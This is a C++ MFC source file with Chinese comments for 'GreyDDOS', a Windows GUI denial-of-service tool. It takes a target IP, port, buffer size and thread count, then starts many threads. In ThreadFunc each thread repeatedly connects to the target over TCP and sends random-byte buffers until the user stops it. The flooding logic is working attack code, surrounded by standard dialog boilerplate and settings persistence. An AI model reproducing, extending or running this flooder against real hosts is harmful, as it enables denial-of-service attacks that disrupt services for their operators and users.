
// GreyDDOSDlg.cpp: 实现文件
//

#include "stdafx.h"
#include "GreyDDOS.h"
#include "GreyDDOSDlg.h"
#include "afxdialogex.h"
#include "UpdateLogDlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif


// 用于应用程序“关于”菜单项的 CAboutDlg 对话框

class CAboutDlg : public CDialogEx
{
public:
	CAboutDlg();

// 对话框数据
#ifdef AFX_DESIGN_TIME
	enum { IDD = IDD_ABOUTBOX };
#endif

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV 支持

// 实现
protected:
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialogEx(IDD_ABOUTBOX)
{
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)
END_MESSAGE_MAP()


// CGreyDDOSDlg 对话框



CGreyDDOSDlg::CGreyDDOSDlg(CWnd* pParent /*=nullptr*/)
	: CDialogEx(IDD_GREYDDOS_DIALOG, pParent)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
	m_bAttacking = FALSE;
	m_szIP = _T("");
	m_nPort = 0;
	m_nMemory = 0;
	m_nDeadThread = 0;
	m_nAliveThread = 0;
	m_nRunningThread = 0;
}

void CGreyDDOSDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_IP, m_ip);
	//  DDX_Control(pDX, IDC_PORT, m_port);
	//  DDX_Control(pDX, IDC_MEMORY, m_memory);
	//  DDX_Control(pDX, IDC_COUNT, m_count);
	//  DDX_Control(pDX, IDC_DEAD_THREAD, m_deadThread);
	//  DDX_Control(pDX, IDC_ALIVE_THREAD, m_aliveThread);
	DDX_Control(pDX, IDC_DEAD_THREAD, m_deadThread);
	DDX_Control(pDX, IDC_ALIVE_THREAD, m_aliveThread);
}

BEGIN_MESSAGE_MAP(CGreyDDOSDlg, CDialogEx)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_COMMAND(ID_HELP_ABOUT, &CGreyDDOSDlg::OnHelpAbout)
	ON_BN_CLICKED(IDOK, &CGreyDDOSDlg::OnBnClickedOk)
	ON_BN_CLICKED(IDC_STOP, &CGreyDDOSDlg::OnBnClickedStop)
	ON_WM_CREATE()
	ON_WM_TIMER()
	ON_COMMAND(ID_HELP_UPDATE_LOG, &CGreyDDOSDlg::OnHelpUpdateLog)
	ON_WM_DESTROY()
END_MESSAGE_MAP()


// CGreyDDOSDlg 消息处理程序

BOOL CGreyDDOSDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// 将“关于...”菜单项添加到系统菜单中。

	// IDM_ABOUTBOX 必须在系统命令范围内。
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != nullptr)
	{
		BOOL bNameValid;
		CString strAboutMenu;
		bNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX);
		ASSERT(bNameValid);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// 设置此对话框的图标。  当应用程序主窗口不是对话框时，框架将自动
	//  执行此操作
	SetIcon(m_hIcon, TRUE);			// 设置大图标
	SetIcon(m_hIcon, FALSE);		// 设置小图标

	SetDlgItemInt(IDC_DEAD_THREAD, 0);
	SetDlgItemInt(IDC_ALIVE_THREAD, 0);

	CFileFind finder;
	if (!finder.FindFile(L"./info.data"))
	{
		CFile file;
		if (!file.Open(L"./info.data", CFile::modeWrite | CFile::modeCreate))
		{
			ShowError(L"创建文件 \"./info.data\" 失败！");
			EndDialog(-1);
		}
		CArchive ar(&file, CArchive::store);
		ar << (CString)L"" << (CString)L"" << (CString)L"1024" << (CString)L"300";
		ar.Close();
		file.Close();
	}
	CFile file;
	if (!file.Open(L"./info.data", CFile::modeRead))
	{
		ShowError(L"打开文件 \"./info.data\" 失败！");
		EndDialog(-1);
	}
	CArchive ar(&file, CArchive::load);
	CString str;
	ar >> str;
	SetDlgItemText(IDC_IP, str);
	ar >> str;
	SetDlgItemText(IDC_PORT, str);
	ar >> str;
	SetDlgItemText(IDC_MEMORY, str);
	ar >> str;
	SetDlgItemText(IDC_COUNT, str);

	return TRUE;  // 除非将焦点设置到控件，否则返回 TRUE
}

void CGreyDDOSDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialogEx::OnSysCommand(nID, lParam);
	}
}

// 如果向对话框添加最小化按钮，则需要下面的代码
//  来绘制该图标。  对于使用文档/视图模型的 MFC 应用程序，
//  这将由框架自动完成。

void CGreyDDOSDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // 用于绘制的设备上下文

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// 使图标在工作区矩形中居中
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// 绘制图标
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
}

//当用户拖动最小化窗口时系统调用此函数取得光标
//显示。
HCURSOR CGreyDDOSDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}



BOOL CGreyDDOSDlg::PreTranslateMessage(MSG* pMsg)
{
	if (pMsg->message == WM_KEYDOWN && pMsg->wParam == VK_ESCAPE)
		pMsg->wParam = NULL;

	return CDialogEx::PreTranslateMessage(pMsg);
}


void CGreyDDOSDlg::OnHelpAbout()
{
	CAboutDlg dlg;
	dlg.DoModal();
}


void CGreyDDOSDlg::OnBnClickedOk()
{
	GetDlgItem(IDC_IP)->EnableWindow(FALSE);
	GetDlgItem(IDC_PORT)->EnableWindow(FALSE);
	GetDlgItem(IDC_MEMORY)->EnableWindow(FALSE);
	GetDlgItem(IDC_COUNT)->EnableWindow(FALSE);
	GetDlgItem(IDOK)->EnableWindow(FALSE);
	m_ip.GetWindowText(m_szIP);
	m_nPort = GetDlgItemInt(IDC_PORT);
	m_nMemory = GetDlgItemInt(IDC_MEMORY);
	m_statusBar.SetPaneText(0, L"正在尝试连接服务器...");
	CSocket test;
	test.Create();
	if (!test.Connect(m_szIP, m_nPort))
	{
		CString szText;
		szText.Format(L"无法连接到 \"%s:%d\" ！", m_szIP, m_nPort);
		ShowError(szText);
		m_statusBar.SetPaneText(0, L"就绪");
		GetDlgItem(IDC_IP)->EnableWindow(TRUE);
		GetDlgItem(IDC_PORT)->EnableWindow(TRUE);
		GetDlgItem(IDC_MEMORY)->EnableWindow(TRUE);
		GetDlgItem(IDC_COUNT)->EnableWindow(TRUE);
		GetDlgItem(IDOK)->EnableWindow(TRUE);
		return;
	}
	m_statusBar.SetPaneText(0, L"就绪");
	int nCount = GetDlgItemInt(IDC_COUNT);
	int i = 0;
	m_bAttacking = TRUE;
	SetDlgItemInt(IDC_DEAD_THREAD, 0);
	SetDlgItemInt(IDC_ALIVE_THREAD, 0);
	for (; i < nCount; i++)
	{
		CString szText;
		szText.Format(L"正在启动线程...(%d/%d)", i + 1, nCount);
		m_statusBar.SetPaneText(0, szText);
		AfxBeginThread(ThreadFunc, this, THREAD_PRIORITY_NORMAL);
	}
	m_statusBar.SetPaneText(0, L"就绪");
	GetDlgItem(IDC_STOP)->EnableWindow(TRUE);
}


void CGreyDDOSDlg::OnBnClickedStop()
{
	m_bAttacking = FALSE;
	SetTimer(0, 1, NULL);
	GetDlgItem(IDC_STOP)->EnableWindow(FALSE);
}


UINT ThreadFunc(void *param)
{
	CGreyDDOSDlg *pDlg = (CGreyDDOSDlg *)param;
	++pDlg->m_nRunningThread;
	while (pDlg->m_bAttacking)
	{
		CSocket socket;
		socket.Create();
		if (socket.Connect(pDlg->m_szIP, pDlg->m_nPort))
		{
			++pDlg->m_nAliveThread;
			pDlg->FreshAliveThread();
			while (pDlg->m_bAttacking)
			{
				char *s = new char[pDlg->m_nMemory];
				int i = 0;
				srand((UINT)time);
				for (; i < pDlg->m_nMemory; i++)
				{
					s[i] = rand() % 128;
				}
				if (SOCKET_ERROR/*=-1*/ == socket.Send(s, pDlg->m_nMemory))
				{
					++pDlg->m_nDeadThread;
					pDlg->FreshDeadThread();
					--pDlg->m_nAliveThread;
					pDlg->FreshAliveThread();
					break;
				}
			}
		}
	}
	--pDlg->m_nRunningThread;
	pDlg->SetTimer(0, 1, NULL);
	return 0;
}


void CGreyDDOSDlg::ShowError(CString szText)
{
	UINT dwError = GetLastError();
	LPVOID lpMsgBuf;
	FormatMessage(
		FORMAT_MESSAGE_ALLOCATE_BUFFER |
		FORMAT_MESSAGE_FROM_SYSTEM |
		FORMAT_MESSAGE_IGNORE_INSERTS,
		NULL,
		dwError,
		MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), // Default language
		(LPTSTR)&lpMsgBuf,
		0,
		NULL
	);

	CString text;
	text.Format(L"%s\n错误代码：%d\n错误信息：%s", szText, dwError, (LPCTSTR)lpMsgBuf);
	MessageBox(text, L"错误", MB_OK | MB_ICONERROR);

	LocalFree(lpMsgBuf);
}


void CGreyDDOSDlg::FreshDeadThread()
{
	SetDlgItemInt(IDC_DEAD_THREAD, m_nDeadThread);
}


void CGreyDDOSDlg::FreshAliveThread()
{
	if(m_bAttacking)
		SetDlgItemInt(IDC_ALIVE_THREAD, m_nAliveThread);
	else
		SetDlgItemInt(IDC_ALIVE_THREAD, m_nRunningThread);
}


static UINT indicators[] =
{
	ID_SEPARATOR
};


int CGreyDDOSDlg::OnCreate(LPCREATESTRUCT lpCreateStruct)
{
	if (CDialogEx::OnCreate(lpCreateStruct) == -1)
		return -1;

	m_statusBar.Create(this);
	m_statusBar.SetIndicators(indicators, 1);
	RepositionBars(AFX_IDW_CONTROLBAR_FIRST, AFX_IDW_CONTROLBAR_LAST, ID_SEPARATOR);
	m_statusBar.SetPaneText(0, L"就绪");

	return 0;
}


void CGreyDDOSDlg::OnTimer(UINT_PTR nIDEvent)
{
	switch (nIDEvent)
	{
	case 0:
	{
		KillTimer(0);
		int nCount = GetDlgItemInt(IDC_COUNT);
		CString szText;
		szText.Format(L"正在等待线程退出（这可能需要几分钟的时间）...(%d/%d)", nCount - m_nRunningThread, nCount);
		m_statusBar.SetPaneText(0, szText);
		FreshAliveThread();
		if (!m_nRunningThread)
		{
			SetTimer(1, 1, NULL);
		}
		break;
	}
	case 1:
	{
		KillTimer(1);
		m_statusBar.SetPaneText(0, L"就绪");
		GetDlgItem(IDC_IP)->EnableWindow(TRUE);
		GetDlgItem(IDC_PORT)->EnableWindow(TRUE);
		GetDlgItem(IDC_MEMORY)->EnableWindow(TRUE);
		GetDlgItem(IDC_COUNT)->EnableWindow(TRUE);
		GetDlgItem(IDOK)->EnableWindow(TRUE);
		GetDlgItem(IDC_STOP)->EnableWindow(FALSE);
		SetDlgItemInt(IDC_DEAD_THREAD, 0);
		SetDlgItemInt(IDC_ALIVE_THREAD, 0);
		break;
	}
	}

	CDialogEx::OnTimer(nIDEvent);
}


void CGreyDDOSDlg::OnHelpUpdateLog()
{
	CUpdateLogDlg dlg;
	dlg.DoModal();
}


void CGreyDDOSDlg::OnDestroy()
{
	CDialogEx::OnDestroy();

	CFile file;
	if (!file.Open(L"./info.data", CFile::modeWrite))
	{
		ShowError(L"打开文件 \"./info.data\" 失败！");
		EndDialog(-1);
	}
	CArchive ar(&file, CArchive::store);
	CString str;
	GetDlgItemText(IDC_IP, str);
	ar << str;
	GetDlgItemText(IDC_PORT, str);
	ar << str;
	GetDlgItemText(IDC_MEMORY, str);
	ar << str;
	GetDlgItemText(IDC_COUNT, str);
	ar << str;
}
